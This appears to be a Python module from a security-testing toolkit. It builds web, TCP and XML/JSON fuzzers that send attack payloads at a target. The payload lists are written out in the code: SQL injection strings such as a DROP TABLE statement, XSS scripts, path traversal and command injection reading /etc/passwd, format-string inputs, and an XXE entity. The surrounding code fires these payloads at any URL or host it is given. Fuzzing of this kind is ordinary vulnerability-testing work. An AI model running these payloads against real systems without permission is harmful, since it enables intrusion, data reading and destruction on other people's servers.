"""Fuzzing tools for vulnerability discovery"""

import requests
import socket
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
from .utils import ColorPrinter


class WebFuzzer:
    """Web application fuzzer"""
    
    def __init__(self):
        self.session = requests.Session()
        self.found_issues = []
    
    def fuzz_endpoints(self, base_url, wordlist=None, extensions=None):
        """Fuzz web endpoints/directories
        
        Args:
            base_url: Base URL to fuzz
            wordlist: List of paths to test
            extensions: File extensions to test
            
        Returns:
            List of discovered endpoints
        """
        discovered = []
        ColorPrinter.info(f"Fuzzing endpoints for {base_url}")
        
        # Default wordlist if none provided
        if not wordlist:
            wordlist = [
                'admin', 'login', 'backup', 'config', 'database', 'db', 'sql',
                'upload', 'uploads', 'files', 'images', 'img', 'css', 'js',
                'api', 'v1', 'v2', 'wp-admin', 'wp-login', 'phpmyadmin',
                'administrator', 'manage', 'manager', 'panel', 'control',
                'test', 'debug', 'dev', 'development', 'old', 'new'
            ]
        
        # Default extensions
        if not extensions:
            extensions = ['', '.php', '.html', '.asp', '.aspx', '.jsp', '.cgi']
        
        total_tests = len(wordlist) * len(extensions)
        ColorPrinter.info(f"Testing {total_tests} combinations")
        
        def test_endpoint(path, ext):
            try:
                url = f"{base_url.rstrip('/')}/{path}{ext}"
                response = self.session.get(url, timeout=5)
                
                # Interesting responses (not 404)
                if response.status_code != 404:
                    discovered.append({
                        'url': url,
                        'status_code': response.status_code,
                        'size': len(response.content)
                    })
                    print(f"  [{response.status_code}] {url}")
                    
            except Exception:
                pass
        
        # Test all combinations
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for path in wordlist:
                for ext in extensions:
                    futures.append(executor.submit(test_endpoint, path, ext))
            
            # Wait for completion
            for future in futures:
                future.result()
        
        return discovered
    
    def fuzz_parameters(self, url, param_names=None):
        """Fuzz URL parameters for injection vulnerabilities
        
        Args:
            url: Base URL with parameters
            param_names: Parameter names to fuzz
            
        Returns:
            List of potential vulnerabilities
        """
        vulnerabilities = []
        ColorPrinter.info(f"Fuzzing parameters for {url}")
        
        if not param_names:
            # Extract parameters from URL
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(url)
            param_names = list(parse_qs(parsed.query).keys()) if parsed.query else ['id', 'page', 'file']
        
        # Payloads for different vulnerability types
        payloads = {
            'sql_injection': ["'", "1' OR '1'='1", "'; DROP TABLE users--"],
            'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
            'lfi': ["../../../etc/passwd", "../../../../windows/system32/drivers/etc/hosts"],
            'command_injection': ["; ls", "| cat /etc/passwd", "&& whoami"]
        }
        
        for param in param_names:
            for vuln_type, payload_list in payloads.items():
                for payload in payload_list:
                    test_url = url.replace(f"{param}=", f"{param}={payload}")
                    try:
                        response = self.session.get(test_url, timeout=5)
                        
                        # Simple heuristics for detection
                        indicators = {
                            'sql_injection': ['mysql', 'syntax error', 'unclosed quotation'],
                            'xss': ['<script>', 'onerror=', 'alert('],
                            'lfi': ['root:x:', 'bin/bash', '[boot loader]'],
                            'command_injection': ['uid=', 'gid=', 'Permission denied']
                        }
                        
                        content = response.text.lower()
                        if any(indicator in content for indicator in indicators[vuln_type]):
                            vulnerabilities.append({
                                'parameter': param,
                                'type': vuln_type,
                                'payload': payload,
                                'url': test_url
                            })
                            ColorPrinter.success(f"Potential {vuln_type} in {param}")
                            
                    except Exception:
                        pass
        
        return vulnerabilities


class ProtocolFuzzer:
    """Network protocol fuzzer"""
    
    def __init__(self):
        pass
    
    def fuzz_tcp(self, target, port, payload_generator=None):
        """Fuzz TCP service
        
        Args:
            target: Target IP
            port: Target port
            payload_generator: Function to generate payloads
            
        Returns:
            List of interesting responses
        """
        results = []
        ColorPrinter.info(f"Fuzzing TCP service {target}:{port}")
        
        if not payload_generator:
            payload_generator = self._default_tcp_payloads
        
        payloads = payload_generator()
        ColorPrinter.info(f"Sending {len(payloads)} payloads")
        
        for i, payload in enumerate(payloads):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                
                # Send payload
                if isinstance(payload, str):
                    sock.send(payload.encode())
                else:
                    sock.send(payload)
                
                # Receive response
                try:
                    response = sock.recv(1024)
                    if response:
                        results.append({
                            'payload': payload,
                            'response_size': len(response),
                            'response_preview': response[:50]
                        })
                except socket.timeout:
                    results.append({
                        'payload': payload,
                        'response_size': 0,
                        'response_preview': 'Timeout'
                    })
                
                sock.close()
                
                if i % 50 == 0:
                    print(f"  Sent {i}/{len(payloads)} payloads")
                    
            except Exception as e:
                results.append({
                    'payload': payload,
                    'error': str(e)
                })
        
        return results
    
    def _default_tcp_payloads(self):
        """Generate default TCP fuzzing payloads"""
        payloads = []
        
        # Various lengths of data
        for length in [0, 1, 10, 100, 1000, 10000]:
            payloads.append(b'A' * length)
            payloads.append(b'\x00' * length)
            payloads.append(b'\xff' * length)
        
        # Special characters and patterns
        special_chars = [b'\x00', b'\x0a', b'\x0d', b'\x1b', b'\x7f']
        for char in special_chars:
            payloads.append(char * 100)
        
        # Format strings
        payloads.extend([
            b'%s%p%x%d',
            b'%.1024d',
            b'%.' + b'1' * 1000 + b'd',
            b'%n%n%n%n',
            b'%x%x%x%x'
        ])
        
        # Random data
        for _ in range(50):
            length = random.randint(1, 2000)
            payload = bytes(random.choices(range(256), k=length))
            payloads.append(payload)
        
        return payloads


class CustomFuzzer:
    """Custom fuzzing framework"""
    
    def __init__(self):
        self.templates = {}
    
    def add_template(self, name, template_func):
        """Add custom fuzzing template
        
        Args:
            name: Template name
            template_func: Function that generates payloads
        """
        self.templates[name] = template_func
    
    def fuzz_with_template(self, name, target_func, *args, **kwargs):
        """Fuzz using custom template
        
        Args:
            name: Template name
            target_func: Function to test with payloads
            *args, **kwargs: Arguments for target function
            
        Returns:
            List of results
        """
        if name not in self.templates:
            ColorPrinter.error(f"Template '{name}' not found")
            return []
        
        ColorPrinter.info(f"Fuzzing with template: {name}")
        
        payload_generator = self.templates[name]
        payloads = payload_generator(*args, **kwargs)
        results = []
        
        for i, payload in enumerate(payloads):
            try:
                result = target_func(payload, *args, **kwargs)
                results.append({
                    'payload': payload,
                    'result': result,
                    'index': i
                })
                
                if i % 100 == 0:
                    print(f"  Tested {i}/{len(payloads)} payloads")
                    
            except Exception as e:
                results.append({
                    'payload': payload,
                    'error': str(e),
                    'index': i
                })
        
        return results
    
    def xml_fuzzer(self, tag_name="test"):
        """XML fuzzing template"""
        payloads = [
            f"<{tag_name}>{'A' * 1000}</{tag_name}>",
            f"<{tag_name}>{'%' * 1000}</{tag_name}>",
            f"<{tag_name}><![CDATA[{'A' * 10000}]]></{tag_name}>",
            f"<{tag_name}>{'<nested>' * 100}</{tag_name}>",
            "<?xml version='1.0' encoding='UTF-8'?>" + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
        ]
        return payloads
    
    def json_fuzzer(self, key_name="data"):
        """JSON fuzzing template"""
        payloads = [
            {key_name: "A" * 1000},
            {key_name: 999999999999999999999},
            {key_name: ["A"] * 1000},
            {key_name: {"nested": "A" * 1000}},
            {key_name: None}
        ]
        return payloads


# Convenience functions
def web_fuzz(base_url, wordlist=None, extensions=None):
    """Convenience function for web fuzzing"""
    fuzzer = WebFuzzer()
    return fuzzer.fuzz_endpoints(base_url, wordlist, extensions)

def protocol_fuzz(target, port, payload_generator=None):
    """Convenience function for protocol fuzzing"""
    fuzzer = ProtocolFuzzer()
    return fuzzer.fuzz_tcp(target, port, payload_generator)

def custom_fuzz(template_name, target_func, *args, **kwargs):
    """Convenience function for custom fuzzing"""
    fuzzer = CustomFuzzer()
    # Add common templates
    fuzzer.add_template('xml', fuzzer.xml_fuzzer)
    fuzzer.add_template('json', fuzzer.json_fuzzer)
    return fuzzer.fuzz_with_template(template_name, target_func, *args, **kwargs)